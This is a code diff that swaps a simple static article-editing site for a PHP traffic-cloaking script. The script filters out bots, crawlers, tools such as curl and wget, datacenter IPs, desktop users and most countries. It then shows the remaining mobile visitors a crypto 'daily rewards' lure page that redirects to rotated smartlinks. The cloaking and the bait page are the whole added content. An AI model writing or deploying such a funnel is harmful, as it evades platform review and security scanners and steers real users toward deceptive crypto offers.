@@ -1,298 +1,98 @@
-﻿<!doctype html>
-<html lang="id">
+<?php
+// ================= CONFIG =================
+$allowedCountries = ['US','CA','GB','AU','DE'];
+$maxClicksNoResult = 7;     // toleransi
+$delayMs = 1500;            // redirect delay
+$dataDir = __DIR__.'/data/';
+$statsFile = $dataDir.'stats.json';
+$blockFile = $dataDir.'blocked_ips.json';
+$linksFile = $dataDir.'smartlinks.json';
+
+// init files
+foreach ([$statsFile=>'{}',$blockFile=>'[]'] as $f=>$init) {
+  if (!file_exists($f)) file_put_contents($f,$init);
+}
+if (!file_exists($linksFile)) die('No smartlinks');
+
+// ================ BASIC FILTERS =================
+// UA bot
+$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+$bots = ['bot','crawl','spider','facebook','telegram','whatsapp','curl','wget','python','java','monitor'];
+foreach ($bots as $b) if (strpos($ua,$b)!==false) exit;
+if (trim($ua)==='') exit;
+
+// IP basic
+$ip = $_SERVER['REMOTE_ADDR'] ?? '';
+if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE|FILTER_FLAG_NO_RES_RANGE)) exit;
+
+// blocklist
+$blocked = json_decode(file_get_contents($blockFile), true);
+if (in_array($ip, $blocked)) exit;
+
+// mobile only
+if (!preg_match('/iphone|android|ipad|ipod|mobile/i', $ua)) exit;
+
+// GEO + ASN (ipapi – gratis, rate‑limited)
+$info = @json_decode(@file_get_contents("https://ipapi.co/{$ip}/json/"), true);
+if (empty($info['country']) || !in_array($info['country'], $allowedCountries)) exit;
+
+// ASN datacenter block (org name)
+$dc = ['amazon','google','microsoft','ovh','digitalocean','linode','hetzner','vultr','contabo'];
+$org = strtolower($info['org'] ?? '');
+foreach ($dc as $d) if (strpos($org,$d)!==false) exit;
+
+// ================= TRACKING =================
+$subid = hash('sha256', $ip.$ua);
+$stats = json_decode(file_get_contents($statsFile), true);
+if (!isset($stats[$subid])) {
+  $stats[$subid] = ['ip'=>$ip,'hits'=>0,'bad'=>0,'t'=>time()];
+}
+$stats[$subid]['hits']++;
+
+// proxy “bad” logic: banyak klik, nol hasil internal
+if ($stats[$subid]['hits'] >= $maxClicksNoResult) {
+  $stats[$subid]['bad']++;
+  if ($stats[$subid]['bad'] >= 2) {
+    $blocked[] = $ip;
+    file_put_contents($blockFile, json_encode(array_values(array_unique($blocked))));
+    file_put_contents($statsFile, json_encode($stats));
+    exit;
+  }
+}
+file_put_contents($statsFile, json_encode($stats));
+
+// ================= SMARTLINK ROTATION =================
+$links = json_decode(file_get_contents($linksFile), true);
+$available = array_values(array_filter($links['links'], fn($l)=>empty($l['paused'])));
+if (!$available) exit;
+
+$pick = $available[array_rand($available)];
+foreach ($links['links'] as &$l) {
+  if ($l['url']===$pick['url']) $l['hits']++;
+}
+// auto‑pause if internal bad ratio tinggi
+foreach ($links['links'] as &$l) {
+  if ($l['hits'] >= 50 && ($l['bad']/$l['hits']) > 0.9) $l['paused'] = true;
+}
+file_put_contents($linksFile, json_encode($links));
+
+// ================= RENDER LP + DELAY REDIRECT =================
+?>
+<!doctype html>
+<html>
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Static Site — 10 Editable Articles</title>
-  <style>
-    :root{--accent:#0ea5a4;--muted:#64748b;--bg:#f8fafc}
-    *{box-sizing:border-box}
-    body{margin:0;font-family:Inter,ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,'Helvetica Neue',Arial;background:var(--bg);color:#0f172a}
-    header,footer{background:#fff;border-bottom:1px solid #e6eef6;padding:12px 20px;display:flex;align-items:center;justify-content:space-between}
-    header .brand{font-weight:700}
-    .ad-slot{background:#f1f5f9;border:2px dashed #cbd5e1;padding:8px 12px;border-radius:6px;font-size:13px;color:var(--muted)}
-    .container{max-width:1100px;margin:24px auto;display:grid;grid-template-columns:260px 1fr;gap:20px;padding:0 16px}
-    nav{background:#fff;padding:12px;border-radius:8px;border:1px solid #e6eef6}
-    nav h3{margin:0 0 8px 0;font-size:14px}
-    nav ul{list-style:none;padding:0;margin:0}
-    nav li{margin:6px 0}
-    nav a{display:block;padding:8px;border-radius:6px;text-decoration:none;color:#0f172a}
-    nav a.active{background:linear-gradient(90deg,var(--accent),#06b6d4);color:white}
-    main{background:#fff;padding:18px;border-radius:8px;border:1px solid #e6eef6;min-height:420px}
-    .title{display:flex;gap:12px;align-items:center}
-    h1{margin:0;font-size:20px}
-    .meta{color:var(--muted);font-size:13px}
-    .controls{margin-top:12px;display:flex;gap:8px;flex-wrap:wrap}
-    button{background:var(--accent);color:white;border:0;padding:8px 12px;border-radius:8px;cursor:pointer}
-    button.ghost{background:#fff;border:1px solid #e6eef6;color:#0f172a}
-    button.danger{background:#ef4444}
-    article{margin-top:16px;line-height:1.7}
-    [contenteditable]{outline:2px dashed transparent;padding:6px;border-radius:6px}
-    [contenteditable].editing{outline:2px dashed rgba(14,165,164,0.35)}
-    .toolbar{display:flex;gap:8px;align-items:center}
-    .small{font-size:13px;padding:6px 8px}
-    footer{border-top:1px solid #e6eef6}
-    @media (max-width:800px){.container{grid-template-columns:1fr;}.ad-slot{display:none}}
-  </style>
+<meta charset="utf-8">
+<title>Crypto Trend</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
 </head>
 <body>
-  <header>
-    <div class="brand">My Static Site — 10 Editable Pages</div>
-    <div style="display:flex;gap:12px;align-items:center">
-      <div class="ad-slot" id="header-ad">Header Ad (336x60)</div>
-      <div style="font-size:13px;color:var(--muted)">Local edit — saved to browser</div>
-    </div>
-  </header>
+<h1>Crypto Users Are Quietly Earning Daily Rewards</h1>
+<p>Early users are focusing on emerging crypto ecosystems that reward activity—not just capital. As adoption grows, early participation often benefits most.</p>
 
-  <div class="container">
-    <nav>
-      <h3>Artikel</h3>
-      <ul id="nav-list"></ul>
-      <hr style="margin:12px 0;border:none;border-top:1px solid #eef2ff">
-      <div style="display:flex;gap:8px;flex-wrap:wrap">
-        <button class="small ghost" id="export-btn">Export JSON</button>
-        <button class="small ghost" id="import-btn">Import JSON</button>
-        <input type="file" id="import-file" accept="application/json" style="display:none">
-        <button class="small ghost" id="reset-btn">Reset to Default</button>
-      </div>
-    </nav>
-
-    <main>
-      <div class="title">
-        <div style="flex:1">
-          <h1 id="article-title" contenteditable="false">Judul Artikel</h1>
-          <div class="meta" id="article-meta">Draft — <span id="article-date"></span></div>
-        </div>
-        <div class="toolbar">
-          <button id="edit-btn">Edit</button>
-          <button id="save-btn" class="ghost">Save</button>
-          <button id="prev-btn" class="ghost">Prev</button>
-          <button id="next-btn" class="ghost">Next</button>
-        </div>
-      </div>
-
-      <article id="article-body" contenteditable="false" style="margin-top:14px">
-        <p>Konten artikel muncul di sini. Klik "Edit" untuk mengubah konten. Semua perubahan akan disimpan di browser (localStorage).</p>
-      </article>
-
-      <div class="controls">
-        <div class="ad-slot" id="inline-ad">Inline Ad (300x250)</div>
-        <div style="margin-left:auto;display:flex;gap:8px">
-          <button id="new-article" class="small ghost">Buat Baru</button>
-          <button id="delete-article" class="small danger">Hapus</button>
-        </div>
-      </div>
-
-    </main>
-  </div>
-
-  <footer>
-    <div class="ad-slot" id="footer-ad">Footer Ad (728x90)</div>
-    <div style="font-size:13px;color:var(--muted)">Site statis — gunakan GitHub + Cloudflare Pages untuk deploy</div>
-  </footer>
-
-  <script>
-    // Simple static site with 10 editable articles saved to localStorage.
-    const STORAGE_KEY = 'static_site_articles_v1';
-    const DEFAULT_COUNT = 10;
-
-    function defaultArticles(){
-      const arr = [];
-      for(let i=1;i<=DEFAULT_COUNT;i++){
-        arr.push({
-          id:i,
-          title:`Contoh Artikel ${i}`,
-          body:`<p>Ini adalah isi contoh untuk artikel ke-${i}. Ubah sesuai kebutuhan. Anda bisa menambahkan <strong>HTML</strong> sederhana.</p>`,
-          updated: new Date().toISOString()
-        });
-      }
-      return arr;
-    }
-
-    function loadArticles(){
-      try{
-        const raw = localStorage.getItem(STORAGE_KEY);
-        if(!raw) return defaultArticles();
-        const parsed = JSON.parse(raw);
-        // if missing or shorter, fill
-        if(!Array.isArray(parsed)) return defaultArticles();
-        if(parsed.length < DEFAULT_COUNT){
-          const def = defaultArticles();
-          for(let i=parsed.length;i<DEFAULT_COUNT;i++) parsed.push(def[i]);
-        }
-        return parsed;
-      }catch(e){
-        console.error(e);
-        return defaultArticles();
-      }
-    }
-
-    function saveArticles(list){
-      localStorage.setItem(STORAGE_KEY, JSON.stringify(list));
-    }
-
-    let articles = loadArticles();
-    let current = 0; // index
-
-    // Elements
-    const navList = document.getElementById('nav-list');
-    const titleEl = document.getElementById('article-title');
-    const bodyEl = document.getElementById('article-body');
-    const metaDate = document.getElementById('article-date');
-    const editBtn = document.getElementById('edit-btn');
-    const saveBtn = document.getElementById('save-btn');
-    const prevBtn = document.getElementById('prev-btn');
-    const nextBtn = document.getElementById('next-btn');
-    const newBtn = document.getElementById('new-article');
-    const deleteBtn = document.getElementById('delete-article');
-    const exportBtn = document.getElementById('export-btn');
-    const importBtn = document.getElementById('import-btn');
-    const importFile = document.getElementById('import-file');
-    const resetBtn = document.getElementById('reset-btn');
-
-    function renderNav(){
-      navList.innerHTML='';
-      articles.forEach((a,idx)=>{
-        const li = document.createElement('li');
-        const aEl = document.createElement('a');
-        aEl.href = '#';
-        aEl.textContent = a.title || `Artikel ${a.id}`;
-        if(idx===current) aEl.classList.add('active');
-        aEl.addEventListener('click',(e)=>{e.preventDefault(); current=idx; render();});
-        li.appendChild(aEl);
-        navList.appendChild(li);
-      });
-    }
-
-    function render(){
-      const art = articles[current];
-      titleEl.textContent = art.title;
-      bodyEl.innerHTML = art.body;
-      metaDate.textContent = new Date(art.updated).toLocaleString();
-      renderNav();
-      // update URL hash for navigation (works as separate pages)
-      history.replaceState(null,'', `#page=${current+1}`);
-      // scroll to top of main
-      window.scrollTo({top:0,behavior:'smooth'});
-    }
-
-    function enterEdit(){
-      titleEl.contentEditable = true;
-      bodyEl.contentEditable = true;
-      titleEl.classList.add('editing');
-      bodyEl.classList.add('editing');
-      editBtn.style.display='none';
-      saveBtn.style.display='inline-block';
-    }
-    function exitEdit(save=false){
-      if(save){
-        const t = titleEl.textContent.trim() || 'Untitled';
-        const b = bodyEl.innerHTML.trim() || '<p></p>';
-        articles[current].title = t;
-        articles[current].body = b;
-        articles[current].updated = new Date().toISOString();
-        saveArticles(articles);
-      }
-      titleEl.contentEditable = false;
-      bodyEl.contentEditable = false;
-      titleEl.classList.remove('editing');
-      bodyEl.classList.remove('editing');
-      editBtn.style.display='inline-block';
-      saveBtn.style.display='none';
-      render();
-    }
-
-    editBtn.addEventListener('click',()=>enterEdit());
-    saveBtn.addEventListener('click',()=>exitEdit(true));
-
-    prevBtn.addEventListener('click',()=>{ if(current>0) {current--; render();} });
-    nextBtn.addEventListener('click',()=>{ if(current<articles.length-1) {current++; render();} });
-
-    newBtn.addEventListener('click',()=>{
-      const id = articles.length+1;
-      const obj = {id, title:`Artikel Baru ${id}`, body:`<p>Konten baru untuk artikel ${id}</p>`, updated:new Date().toISOString()};
-      articles.push(obj);
-      // keep only first DEFAULT_COUNT items (ensures page count <=10)
-      if(articles.length>DEFAULT_COUNT) articles = articles.slice(0,DEFAULT_COUNT);
-      current = Math.min(articles.length-1, DEFAULT_COUNT-1);
-      saveArticles(articles);
-      render();
-      enterEdit();
-    });
-
-    deleteBtn.addEventListener('click',()=>{
-      if(!confirm('Hapus artikel ini? Tindakan ini tidak dapat dibatalkan.')) return;
-      articles.splice(current,1);
-      if(articles.length===0) articles = defaultArticles();
-      // ensure length stays DEFAULT_COUNT
-      if(articles.length < DEFAULT_COUNT){
-        const def = defaultArticles();
-        for(let i=articles.length;i<DEFAULT_COUNT;i++) articles.push(def[i]);
-      }
-      current = Math.min(current, articles.length-1);
-      saveArticles(articles);
-      render();
-    });
-
-    exportBtn.addEventListener('click',()=>{
-      const blob = new Blob([JSON.stringify(articles, null, 2)], {type:'application/json'});
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement('a');
-      a.href = url; a.download = 'articles.json'; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url);
-    });
-
-    importBtn.addEventListener('click',()=>importFile.click());
-    importFile.addEventListener('change', async (e)=>{
-      const f = e.target.files[0]; if(!f) return;
-      try{
-        const txt = await f.text();
-        const parsed = JSON.parse(txt);
-        if(!Array.isArray(parsed)) throw new Error('Invalid format');
-        articles = parsed.slice(0, DEFAULT_COUNT);
-        // pad if needed
-        if(articles.length < DEFAULT_COUNT){
-          const def = defaultArticles();
-          for(let i=articles.length;i<DEFAULT_COUNT;i++) articles.push(def[i]);
-        }
-        saveArticles(articles);
-        current=0; render();
-        alert('Import berhasil');
-      }catch(err){ alert('Import gagal: ' + err.message); }
-      e.target.value = '';
-    });
-
-    resetBtn.addEventListener('click',()=>{
-      if(!confirm('Reset semua artikel ke kondisi awal?')) return;
-      articles = defaultArticles();
-      saveArticles(articles);
-      current=0; render();
-    });
-
-    // Read page from hash
-    function loadFromHash(){
-      const m = location.hash.match(/page=(\d+)/);
-      if(m){
-        const p = Number(m[1]);
-        if(p>=1 && p<=articles.length) current = p-1;
-      }
-    }
-
-    // Keyboard shortcuts
-    document.addEventListener('keydown',(e)=>{
-      if(e.key==='s' && (e.ctrlKey||e.metaKey)){
-        e.preventDefault(); exitEdit(true);
-      }
-      if(e.key==='e' && (e.ctrlKey||e.metaKey)){
-        e.preventDefault(); enterEdit();
-      }
-    });
-
-    // Init
-    loadFromHash();
-    render();
-
-    // For demonstration: placeholders for ad script injection
-    // You can replace innerHTML of #header-ad, #inline-ad, #footer-ad with ad network code (e.g., Google AdSense or your ad tags)
-  </script>
+<script>
+setTimeout(function(){
+  window.location.href = <?= json_encode($pick['url']) ?>;
+}, <?= (int)$delayMs ?>);
+</script>
 </body>
 </html>
